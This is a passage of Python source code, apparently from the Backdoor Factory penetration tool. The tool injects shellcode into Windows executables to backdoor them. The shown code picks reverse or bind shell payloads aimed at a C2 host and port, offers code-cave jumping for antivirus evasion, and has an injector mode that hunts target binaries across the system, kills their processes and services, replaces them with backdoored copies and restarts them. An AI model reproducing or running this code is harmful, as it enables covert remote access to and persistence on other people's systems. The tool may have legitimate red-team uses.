            if i == (len(flItms['CavesPicked']) - 2) and flItms['stager'] is False:
                f.write(temp_jmp)
    else:
        for i, item in flItms['CavesPicked'].iteritems():
            if i == 0:
                f.seek(int(flItms['CavesPicked'][i][1], 16))
                f.write(flItms['completeShellcode'])

    print "[*] {0} backdooring complete".format(filename)
    f.close()
    if verbose is True:
        print_flItms(flItms)

    return True


def output_options(input_file, output_file=""):
    """
    Output file check.
    """
    if not output_file:
        output_file = os.path.basename(input_file)
    return output_file


def set_shells(flItms, SHELL, PORT, HOST):
    """
    This function sets the shellcode.
    """
    print "[*] Looking for and setting selected shellcode"
    if flItms['Magic'] == int('10B', 16):
        flItms['bintype'] = win32_shellcode
    if flItms['Magic'] == int('20B', 16):
        flItms['bintype'] = win64_shellcode
    if not SHELL:
        print "You must choose a backdoor to add: (use -s)"
        for item in dir(flItms['bintype']):
            if "__" in item:
                continue
            else:
                print "   {0}".format(item)
        parser.print_help()
        sys.exit()
    if SHELL not in dir(flItms['bintype']):
        print "The following %ss are available: (use -s)" % str(flItms['bintype']).split(".")[1]
        for item in dir(flItms['bintype']):
            #print item
            if "__" in item:
                continue
            elif "returnshellcode" == item or "pack_ip_addresses" == item or "eat_code_caves" == item:
                continue
            else:
                print "   {0}".format(item)

        sys.exit()
    else:
        shell_cmd = SHELL + "()"
    flItms['shells'] = flItms['bintype'](HOST, PORT)
    flItms['allshells'] = getattr(flItms['shells'], SHELL)(flItms)
    flItms['shellcode'] = flItms['shells'].returnshellcode()


def injector(suffix, change_Access, SHELL, host,
             port, nsection, add_section, verbose, delete_original,
             LocOfEntryinCode_Offset, cave_jumping, supplied_shellcode):
    """
    The injector module will hunt and injection shellcode into
    targets that are in the list_of_targets dict.
    Data format DICT: {process_name_to_backdoor :
                       [('dependencies to kill', ),
                       'service to kill', restart=True/False],
                       }
    """
    print "[*] Beginning injector module"
    os_name = os.name
    if os_name == 'nt':
        if "PROGRAMFILES(x86)" in os.environ:
            print "-You have a 64 bit system"
            system_type = 64
        else:
            print "-You have a 32 bit system"
            system_type = 32
    else:
        print "This works only on windows. :("
        sys.exit()
    winversion = platform.version()
    rootdir = os.path.splitdrive(sys.executable)[0]
    #print rootdir
    targetdirs = []
    excludedirs = []
    #print system_info
    winXP2003x86targetdirs = [rootdir + '\\']
    winXP2003x86excludedirs = [rootdir + '\\Windows\\',
                               rootdir + '\\RECYCLER\\',
                               '\\VMWareDnD\\']
    vista7win82012x64targetdirs = [rootdir + '\\']
    vista7win82012x64excludedirs = [rootdir + '\\Windows\\',
                                    rootdir + '\\RECYCLER\\',
                                    '\\VMwareDnD\\']

    #need win2003, win2008, win8
    if "5.0." in winversion:
        print "-OS is 2000"
        targetdirs = targetdirs + winXP2003x86targetdirs
        excludedirs = excludedirs + winXP2003x86excludedirs
    elif "5.1." in winversion:
        print "-OS is XP"
        if system_type == 64:
            targetdirs.append(rootdir + '\\Program Files (x86)\\')
            excludedirs.append(vista7win82012x64excludedirs)
        else:
            targetdirs = targetdirs + winXP2003x86targetdirs
            excludedirs = excludedirs + winXP2003x86excludedirs
    elif "5.2." in winversion:
        print "-OS is 2003"
        if system_type == 64:
            targetdirs.append(rootdir + '\\Program Files (x86)\\')
            excludedirs.append(vista7win82012x64excludedirs)
        else:
            targetdirs = targetdirs + winXP2003x86targetdirs
            excludedirs = excludedirs + winXP2003x86excludedirs
    elif "6.0." in winversion:
        print "-OS is Vista/2008"
        if system_type == 64:
            targetdirs = targetdirs + vista7win82012x64targetdirs
            excludedirs = excludedirs + vista7win82012x64excludedirs
        else:
            targetdirs.append(rootdir + '\\Program Files\\')
            excludedirs.append(rootdir + '\\Windows\\')
    elif "6.1." in winversion:
        print "-OS is Win7/2008"
        if system_type == 64:
            targetdirs = targetdirs + vista7win82012x64targetdirs
            excludedirs = excludedirs + vista7win82012x64excludedirs
        else:
            targetdirs.append(rootdir + '\\Program Files\\')
            excludedirs.append(rootdir + '\\Windows\\')
    elif "6.2." in winversion:
        print "-OS is Win8/2012"
        targetdirs = targetdirs + vista7win82012x64targetdirs
        excludedirs = excludedirs + vista7win82012x64excludedirs

    filelist = set()
    folderCount = 0

    exclude = False
    for path in targetdirs:
        for root, subFolders, files in os.walk(path):
            for directory in excludedirs:
                if directory.lower() in root.lower():
                    #print directory.lower(), root.lower()
                    #print "Path not allowed", root
                    exclude = True
                    #print exclude
                    break
            if exclude is False:
                for _file in files:
                    f = os.path.join(root, _file)
                    for target, items in list_of_targets.iteritems():
                        if target.lower() == _file.lower():
                            #print target, f
                            print "-- Found the following file:", root + '\\' + _file
                            filelist.add(f)
                            #print exclude
            exclude = False

    #grab tasklist
    process_list = []
    all_process = os.popen("tasklist.exe")
    ap = all_process.readlines()
    all_process.close()
    ap.pop(0)   # remove blank line
    ap.pop(0)   # remove header line
    ap.pop(0)   # remove this ->> =======

    for process in ap:
        process_list.append(process.split())

    #print process_list
    #print filelist
    for target in filelist:
        service_target = False
        running_proc = False
        #get filename
        #support_result = support_check(target, 0)
        #if support_result is False:
        #   continue
        filename = os.path.basename(target)
        file_path = os.path.dirname(target) + '\\'
        for process in process_list:
            #print process
            for setprocess, items in list_of_targets.iteritems():
                if setprocess.lower() in target.lower():
                    #print setprocess, process
                    for item in items[0]:
                        if item.lower() in [x.lower() for x in process]:
                            print "- Killing process:", item
                            try:
                                #print process[1]
                                os.system("taskkill /F /PID %i" %
                                          int(process[1]))
                                running_proc = True
                            except Exception as e:
                                print str(e)
                    if setprocess.lower() in [x.lower() for x in process]:
                        #print True, items[0], items[1]
                        if items[1] is not None:
                            print "- Killing Service:", items[1]
                            try:
                                os.system('net stop %s' % items[1])
                            except Exception as e:
                                print str(e)
                            service_target = True

        time.sleep(1)
        #backdoor the targets here:
        print "*" * 50
        output_file = output_options(target, target + '.bd')
        print "- Backdooring:", target
        result = do_thebackdoor(target, output_file, SHELL,
                                nsection, LocOfEntryinCode_Offset,
                                add_section, cave_jumping, port,
                                host, supplied_shellcode)
        if result:
            pass
        else:
            continue
        shutil.copy2(target, target + suffix)
        os.chmod(target, stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
        time.sleep(1)
        try:
            os.unlink(target)
        except:
            print "unlinking error"
        time.sleep(.5)
        try:
            shutil.copy2(output_file, target)
        except:
            os.system('move {0} {1}'.format(target, output_file))
        time.sleep(.5)
        os.remove(output_file)
        print (" - The original file {0} has been renamed to {1}".format(target,
               target + suffix))

        if delete_original is True:
            print "!!Warning Deleteing Original File!!"
            os.remove(target + suffix)

        if service_target is True:
            #print "items[1]:", list_of_targets[filename][1]
            os.system('net start %s' % list_of_targets[filename][1])
        else:
            try:
                if (list_of_targets[filename][2] is True and
                   running_proc is True):
                    subprocess.Popen([target, ])
                    print "- Restarting:", target
                else:
                    print "-- %s was not found online -  not restarting" % target

            except:
                if (list_of_targets[filename.lower()][2] is True and
                   running_proc is True):
                    subprocess.Popen([target, ])
                    print "- Restarting:", target
                else:
                    print "-- %s was not found online -  not restarting" % target


if __name__ == "__main__":

    signal.signal(signal.SIGINT, signal_handler)

    parser = OptionParser()
    parser.add_option("-f", "--file", dest="FILE", action="store",
                      type="string",
                      help="File to backdoor")
    parser.add_option("-s", "--shell", dest="SHELL", action="store",
                      type="string",
                      help="Payloads that are available for use.")
    parser.add_option("-H", "--hostip", default=None, dest="HOST",
                      action="store", type="string",
                      help="IP of the C2 for reverse connections")
    parser.add_option("-P", "--port", default=None, dest="PORT",
                      action="store", type="int",
                      help="The port to either connect back to for reverse "
                      "shells or to listen on for bind shells")
    parser.add_option("-J", "--cave_jumping", dest="CAVE_JUMPING",
                      default=False, action="store_true",
                      help="Select this options if you want to use code cave"
                      " jumping to further hide your shellcode in the binary."
                      )
    parser.add_option("-a", "--add_new_section", default=False,
                      dest="ADD_SECTION", action="store_true",
                      help="Mandating that a new section be added to the "
                      "exe (better success) but less av avoidance")
    parser.add_option("-U", "--user_shellcode", default=None,
                      dest="SUPPLIED_SHELLCODE", action="store",
                      help="User supplied shellcode, make sure that it matches"
                      " the architecture that you are targeting."
                      )
    parser.add_option("-c", "--cave", default=False, dest="CAVE",
                      action="store_true",
                      help="The cave flag will find code caves that "
                      "can be used for stashing shellcode. "
                      "This will print to all the code caves "
                      "of a specific size."
                      "The -l flag can be use with this setting.")
    parser.add_option("-l", "--shell_length", default=380, dest="SHELL_LEN",
                      action="store", type="int",
                      help="For use with -c to help find code "
                      "caves of different sizes")
    parser.add_option("-o", "--output-file", default="", dest="OUTPUT",
                      action="store", type="string",
                      help="The backdoor output file")
    parser.add_option("-n", "--section", default="sdata", dest="NSECTION",
                      action="store", type="string",
                      help="New section name must be "
                      "less than seven characters")
    parser.add_option("-d", "--directory", dest="DIR", action="store",
                      type="string",
                      help="This is the location of the files that "
                      "you want to backdoor. "
                      "You can make a directory of file backdooring faster by "
                      "forcing the attaching of a codecave "
                      "to the exe by using the -a setting.")
    parser.add_option("-w", "--change_access", default=True,
                      dest="CHANGE_ACCESS", action="store_false",
                      help="This flag changes the section that houses "
                      "the codecave to RWE. Sometimes this is necessary. "
                      "Enabled by default. If disabled, the "
                      "backdoor may fail.")
    parser.add_option("-i", "--injector", default=False, dest="INJECTOR",
                      action="store_true",
                      help="This command turns the backdoor factory in a "
                      "hunt and shellcode inject type of mechinism. Edit "
                      "the target settings in the injector module.")
    parser.add_option("-u", "--suffix", default=".old", dest="SUFFIX",
                      action="store", type="string",
                      help="For use with injector, places a suffix"
                      " on the original file for easy recovery")
    parser.add_option("-D", "--delete_original", default=False,
                      dest="DELETE_ORIGINAL", action="store_true",
                      help="For use with injector module.  This command"
                      " deletes the original file.  Not for use in production "
                      "systems.  *Author not responsible for stupid uses.*")
    parser.add_option("-O", "--disk_offset", default=0,
                      dest="DISK_OFFSET", type="int", action="store",
                      help="Starting point on disk offset, in bytes. "
                      "Some authors want to obfuscate their on disk offset "
                      "to avoid reverse engineering, if you find one of those "
                      "files use this flag, after you find the offset.")
    parser.add_option("-S", "--support_check", dest="SUPPORT_CHECK",
                      default=False, action="store_true",
                      help="To determine if the file is supported by BDF prior"
                      " to backdooring the file. For use by itself or with "
                      "verbose. This check happens automatically if the "
                      "backdooring is attempted."
                      )
    parser.add_option("-q", "--no_banner", dest="NO_BANNER", default=False, action="store_true",
                      help="Kills the banner."
                      )
    parser.add_option("-v", "--verbose", default=False, dest="VERBOSE",
                      action="store_true",
                      help="For debug information output.")

    (options, args) = parser.parse_args()

    if options.NO_BANNER is False:
        print choice(menu)
        print author
        time.sleep(1)

    verbose = options.VERBOSE
    change_access = options.CHANGE_ACCESS

    if options.INJECTOR is True:
        #injector(suffix, change_Access, SHELL, host,
        #     port, nsection, add_section, verbose, delete_original,
        #     LocOfEntryinCode_Offset):
        injector(options.SUFFIX, change_access, options.SHELL,
                 options.HOST, options.PORT,
                 options.NSECTION, options.ADD_SECTION, verbose,
                 options.DELETE_ORIGINAL, options.DISK_OFFSET,
                 options.CAVE_JUMPING, options.SUPPLIED_SHELLCODE)
        sys.exit()

    if options.CAVE is True:
        if not options.FILE:
            print "You must provide a file to look for caves (-f)"
            sys.exit()
        f = open(options.FILE, 'rb')
        flItms = support_check(options.FILE, options.DISK_OFFSET)
        print ("Looking for caves with a size of %s "
               "bytes (measured as an integer)"
               % options.SHELL_LEN)
        find_all_caves(flItms, options.SHELL_LEN)
        sys.exit()

    if options.DIR:
        for root, subFolders, files in os.walk(options.DIR):
            for _file in files:
                options.FILE = os.path.join(root, _file)
                #for item in dirlisting:
                #    options.FILE = options.DIR + '/' + item
                if options.SUPPORT_CHECK is True:
                    if os.path.isfile(options.FILE):
                        print "file", options.FILE
                        try:
                            is_supported = support_check(options.FILE,
                                                         options.DISK_OFFSET)
                        except Exception, e:
                            is_supported = False
                            print 'Exception:', str(e), '%s' % options.FILE
                        if is_supported is False:
                            print "%s is not supported." % options.FILE
                            #continue
                        else:
                            print "%s is supported." % options.FILE
                            if flItms['runas_admin'] is True:
                                print "%s must be run as admin." % options.FILE
                        print "*" * 50
        if options.SUPPORT_CHECK is True:
            sys.exit()

        print ("You are going to backdoor the following "
               "items in the %s directory:"
               % options.DIR)
        dirlisting = os.listdir(options.DIR)
        for item in dirlisting:
            print "     {0}".format(item)
        answer = raw_input("Do you want to continue? (yes/no) ")
        if 'yes' in answer.lower():
            for item in dirlisting:
                #print item
                print "*" * 50
                options.FILE = options.DIR + '/' + item
                print ("backdooring file %s" % item)
                try:
                    output_file = output_options(options.FILE, options.OUTPUT)
                    result = do_thebackdoor(options.FILE,
                                            output_file,
                                            options.SHELL,
                                            options.NSECTION,
                                            options.DISK_OFFSET,
                                            options.ADD_SECTION,
                                            options.CAVE_JUMPING,
                                            options.PORT,
                                            options.HOST,
                                            options.SUPPLIED_SHELLCODE)
                    if result is None:
                        print 'Continuing'
                        continue
                    else:
                        print ("[*] File {0} is in backdoored "
                               "directory".format(output_file))
                except Exception as e:
                    print str(e)
        else:
            print("Goodbye")

        sys.exit()

    if options.SUPPORT_CHECK is True:
        if not options.FILE:
            print "You must provide a file to see if it is supported (-f)"
            sys.exit()
        try:
            is_supported = support_check(options.FILE,
                                         options.DISK_OFFSET)
        except Exception, e:
            is_supported = False
            print 'Exception:', str(e), '%s' % options.FILE
        if is_supported is False:
            print "%s is not supported." % options.FILE
        else:
            print "%s is supported." % options.FILE
            if flItms['runas_admin'] is True:
                    print "%s must be run as admin." % options.FILE
        sys.exit()

    if not options.FILE:
        parser.print_help()
        sys.exit(1)

    output_file = output_options(options.FILE, options.OUTPUT)

    result = do_thebackdoor(options.FILE,
                            output_file,
                            options.SHELL,
                            options.NSECTION,
                            options.DISK_OFFSET,
                            options.ADD_SECTION,
                            options.CAVE_JUMPING,
                            options.PORT,
                            options.HOST,
                            options.SUPPLIED_SHELLCODE)
    if result is True:
        print "File {0} is in the 'backdoored' directory".format(output_file)
